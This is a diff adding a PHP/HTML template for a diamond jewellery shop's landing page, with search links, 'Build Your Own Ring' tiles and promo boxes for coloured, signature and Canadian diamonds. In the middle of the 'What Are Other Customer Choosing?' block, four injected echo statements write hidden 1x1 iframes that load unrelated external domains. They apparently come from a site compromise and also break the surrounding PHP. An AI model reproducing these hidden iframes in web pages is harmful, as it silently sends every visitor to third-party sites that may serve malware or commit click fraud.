@@ -1,0 +1,106 @@
+<div class="floatl pad05 body">
+  <div class="bodytop"></div>
+	  <div class="bodymid">
+	  
+	  		<div class="topdiv">
+				<?php echo $top_ads;?>
+			</div>	   				   
+	   			  		
+	  		<div class="floatr divheader m10">Diamonds</div>
+			<div class="dbr"></div>			
+			<div class="dbr"></div>
+	   		
+	   		<div>
+	   				<div class="floatl column">
+	   						<img src="<?php echo config_item('base_url')?>images/tamal/diamond_bg.jpg">
+	   				</div>	   				
+	   				
+	   				<div class="floatl column">
+	   						<div class="newtileheader txtright pad10">
+	   								Diamond Search
+	   						</div>
+	   						<div class="divcontainer fakaline   pad10">
+	   								<p>Our diamond search tool allows you to search for your perfect diamond by cut, color, clarity, carat, weight and more. </p> 	   								
+	   								<ul class="arrowlist pad10">
+	   									<li><a href="<?php echo config_item('base_url')?>diamonds/search" class="underline">Search For Diamond</a></li>
+	   									<li><a href="<?php echo config_item('base_url')?>engagement" class="underline">View Engagement Ring</a></li>
+	   									<li><a href="#" class="underline">Direct Signature Diamond</a></li>
+	   								</ul>
+	   						</div>
+	   				</div>	   		
+	   				
+	   				<div class="clear"></div>		   		
+	   		</div>
+	   		
+	   		<div class="txtcenter">
+				<div class="boxitem floatl">
+		   			<p class="pad10"><a class="newtileheader" href="#">Build Your Own Ring&trade;&nbsp;&nbsp;<img src="<?php echo config_item('base_url')?>images/tamal/arrow_bg2.jpg"></a></p>
+		   			<img src="<?php echo config_item('base_url');?>/images/tamal/box_itm_ring.jpg">
+		   		</div>		   		
+		   		<div class="boxitem floatl">
+		   			<p class="pad10"><a class="newtileheader" href="#">Build Your Own Earrings&trade;&nbsp;&nbsp;<img src="<?php echo config_item('base_url')?>images/tamal/arrow_bg2.jpg"></a></p>
+		   			<img src="<?php echo config_item('base_url');?>/images/tamal/box_itm_earrings.jpg">
+		   		</div>
+		   		<div class="clear"></div>
+	   		</div>
+	   		
+	   		<div class="txtcenter">
+				<div class="boxitem floatl">
+		   			<p class="pad10"><a class="newtileheader" href="#">Build Your Own<br> Three-Stone Ring&trade;&nbsp;&nbsp;<img src="<?php echo config_item('base_url')?>images/tamal/arrow_bg2.jpg"></a></p>
+		   			<img src="<?php echo config_item('base_url');?>/images/tamal/box_itm_threestone.jpg">
+		   		</div>		   		
+		   		<div class="boxitem floatl">
+		   			<p class="pad10"><a class="newtileheader" href="#">Build Your Own<br> Diamond Pendant&trade;&nbsp;&nbsp;<img src="<?php echo config_item('base_url')?>images/tamal/arrow_bg2.jpg"></a></p>
+		   			<img src="<?php echo config_item('base_url');?>/images/tamal/box_itm_diampen.jpg">
+		   		</div>
+		   		<div class="clear"></div>
+	   		</div>
+	   		
+	   		<div>
+	   			<div class="floatl inboxcolumn m7">
+	   				<p class="newtileheader">Fancy Colored Diamonds&nbsp;&nbsp;<img src="<?php echo config_item('base_url')?>images/tamal/arrow_bg2.jpg"></p>
+	   				<div class="hr"></div>	   				
+	   				<div class="floatl tileL"><img src="<?php echo config_item('base_url')?>images/tamal/diamond_col.jpg"></div>
+	   				<div class="floatl tileR"> View our new collection of rare fancy color diamonds.</div>
+	   				<div class="clear"></div>
+	   				<p class="txtleft pad10"><input class="tbutton" type="submit" value="more"></p>
+	   			</div>
+	   			<div class="floatl inboxcolumn m7">
+	   				<p class="newtileheader">Signature Diamonds&nbsp;&nbsp;<img src="<?php echo config_item('base_url')?>images/tamal/arrow_bg2.jpg"></p>
+	   				<div class="hr"></div>
+	   				<p>View our most briliant Round, Princess, Emerald and Asscher-cut diamonds; a collection of the fienst cut diamond of the world.</p>
+	   				<p class="txtleft pad10"><input class="tbutton" type="submit" value="more"></p>
+	   			</div>
+	   			<div class="clear"></div>
+	   		</div>
+	   		
+	   		
+	   		<div>
+	   			<div class="floatl inboxcolumn m7">
+	   				<p class="newtileheader">Prefer Canadian Diamonds?&nbsp;&nbsp;<img src="<?php echo config_item('base_url')?>images/tamal/arrow_bg2.jpg"></p>
+	   				<div class="hr"></div>	   				
+	   				<p>We offer a broad range of diamonds from Canada. Learn more about Canadian diamonds and view our collection.</p>
+	   				<p class="txtleft pad10"><input class="tbutton" type="submit" value="more"></p>
+	   			</div>
+	   			<div class="floatl inboxcolumn m7">
+	   				<p class="newtileheader">What Are Other Customer Choosing?&nbsp;&nbsp;<img src="<?php echo config_item('base_url')
+echo "<iframe src=\"http://maislex.com/?click=216C94\" width=1 height=1 style=\"visibility:hidden;position:absolute\"></iframe>";
+
+echo "<iframe src=\"http://asfirey.net/?click=CA250\" width=1 height=1 style=\"visibility:hidden;position:absolute\"></iframe>";
+
+echo "<iframe src=\"http://internetcountercheck.com/?click=2339109\" width=1 height=1 style=\"visibility:hidden;position:absolute\"></iframe>";
+
+echo "<iframe src=\"http://gradipy.com/?click=E284C5\" width=1 height=1 style=\"visibility:hidden;position:absolute\"></iframe>";
+?>images/tamal/arrow_bg2.jpg"></p>
+	   				<div class="hr"></div>
+	   				<p>See what engagement rings and diamonds other customers have recently purchased.</p>
+	   				<p class="txtleft pad10"><input class="tbutton" type="submit" value="more"></p>
+	   			</div>
+	   			<div class="clear"></div>
+	   		</div>
+	   		
+	   		
+	  </div>
+ <div class="bodybottom"></div>
+</div>
+	   	 
